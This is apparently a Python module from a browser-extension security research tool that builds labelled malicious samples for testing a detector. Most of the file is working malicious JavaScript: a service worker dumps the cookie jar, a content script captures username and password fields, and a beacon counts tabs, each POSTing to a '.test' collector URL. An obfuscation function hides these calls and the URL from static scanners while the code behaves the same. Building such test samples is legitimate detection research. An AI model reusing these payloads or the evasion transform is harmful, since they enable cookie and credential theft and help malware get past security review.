"""Real JavaScript payload families for synthetic weaponisation.

Each family is genuine extension code that, at runtime, performs a known malicious
behaviour modelled on documented incidents (cookie/session theft, credential capture,
service-worker beaconing). It is injected into a real benign extension to create a
labelled malicious `v2` (see engine.weaponiser.weaponise).

SAFETY: every collector host is under the reserved `.test` TLD (RFC 6761) and resolves
only to the local sandbox; nothing reaches the real internet. These samples exist to be
caught by our own tool and must never be published to any store.

Why an obfuscated variant of each
---------------------------------
`obfuscate_js` rewrites the sensitive tokens (`chrome.cookies`, `document.cookie`,
`fetch`, `.getAll`, the collector URL) so they no longer appear as literals in the source.
The *runtime behaviour is identical* — that is the whole point: a static code-diff scanner
(engine.baseline.static_delta, the "You've Changed" style) can no longer read the intent,
while our dynamic capture still observes the effect. This asymmetry is the head-to-head
experiment in experiments/headtohead.py.
"""

from __future__ import annotations

import base64
import re

#: Marker so injected code is recognisable and a re-run never double-injects.
PAYLOAD_MARKER = "__extdrift_synthetic_payload__"

#: A collector host that resolves only to the local sandbox.
COLLECTOR = "http://collect-metrics.test/ingest"


# --------------------------------------------------------------------------------------
# Family library — each is {content_script, service_worker, permission}
# `content_script` runs in the page; `service_worker` runs in the MV3 background.
# --------------------------------------------------------------------------------------

_COOKIE_THEFT_SW = """
// %(marker)s cookie_theft (SYNTHETIC): dump the cookie jar from the service worker
// and beacon it out with no active page — the MV3 blind spot.
chrome.runtime.onMessage.addListener((m, s, reply) => {
  if (m && m.type === "%(marker)s:harvested") {
    chrome.cookies.getAll({}, (cookies) => {
      fetch("%(collector)s", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookies: (cookies || []).length, page_cookie: m.cookie }),
      }).catch(() => {});
    });
  }
  reply && reply({ ok: true });
  return true;
});
"""

_COOKIE_THEFT_CS = """
// %(marker)s cookie_theft (SYNTHETIC): read the page cookie and hand it to the worker.
setTimeout(() => {
  chrome.runtime.sendMessage({ type: "%(marker)s:harvested", cookie: document.cookie });
}, 1500);
"""

_CREDENTIAL_THEFT_CS = """
// %(marker)s credential_theft (SYNTHETIC): capture the login form and POST it out.
function __extdrift_harvest() {
  const u = document.querySelector("input[name=username]");
  const p = document.querySelector("input#password");
  if (p && p.value) {
    fetch("%(collector)s", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ u: u ? u.value : "", p: p.value, o: location.origin }),
    }).catch(() => {});
  }
}
document.addEventListener("submit", __extdrift_harvest, true);
setTimeout(__extdrift_harvest, 2500);
"""

_SW_BEACON_SW = """
// %(marker)s sw_beacon (SYNTHETIC): periodic background beacon, no page needed.
chrome.tabs && chrome.tabs.query({}, (tabs) => {
  fetch("%(collector)s", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ tabs: (tabs || []).length, t: Date.now() }),
  }).catch(() => {});
});
"""

PAYLOADS: dict[str, dict] = {
    "cookie_theft": {
        "content_script": _COOKIE_THEFT_CS,
        "service_worker": _COOKIE_THEFT_SW,
        "permission": "cookies",
        "description": "Dump the cookie jar from the service worker and beacon it out.",
    },
    "credential_theft": {
        "content_script": _CREDENTIAL_THEFT_CS,
        "service_worker": "",
        "permission": None,
        "description": "Capture the login form and POST it to a collector.",
    },
    "sw_beacon": {
        "content_script": "",
        "service_worker": _SW_BEACON_SW,
        "permission": "tabs",
        "description": "Service-worker beacon with no active page (Karami blind spot).",
    },
}


def render(js_template: str) -> str:
    """Fill the marker/collector placeholders in a payload template."""
    return js_template % {"marker": PAYLOAD_MARKER, "collector": COLLECTOR}


# --------------------------------------------------------------------------------------
# Obfuscation — hide the sensitive tokens from a static scanner, keep behaviour identical
# --------------------------------------------------------------------------------------

def _split_prop(match: re.Match) -> str:
    """Turn `.foo` into `["fo"+"o"]` so the property name is not a literal token."""
    name = match.group(1)
    if len(name) < 3:
        return match.group(0)
    mid = len(name) // 2
    return f'["{name[:mid]}"+"{name[mid:]}"]'


def obfuscate_js(source: str) -> str:
    """Rewrite a payload so its malicious tokens are not visible to static analysis.

    Behaviour is unchanged at runtime; only the *source text* is transformed:
      * high-risk member accesses (`.cookies`, `.getAll`, `.cookie`) become computed
        `["co"+"okies"]` accesses — the literal identifiers disappear;
      * `fetch(` is reached through a computed global lookup;
      * the collector URL is base64-encoded and decoded with atob at runtime.
    A static token/keyword scan therefore finds none of the tells, while the code still
    reads the cookie and calls fetch when executed.
    """
    hot = ("cookies", "getAll", "cookie", "sendMessage", "query", "tabs")
    out = source
    for name in hot:
        out = re.sub(r"\.(" + name + r")\b", _split_prop, out)
    # Route fetch through a computed global reference.
    out = re.sub(r"\bfetch\s*\(", 'globalThis["fet"+"ch"](', out)
    # Encode the collector URL and decode at runtime.
    encoded = base64.b64encode(COLLECTOR.encode()).decode()
    out = out.replace(f'"{COLLECTOR}"', f'atob("{encoded}")')
    return "/* obfuscated payload — behaviour identical, tokens hidden */\n" + out
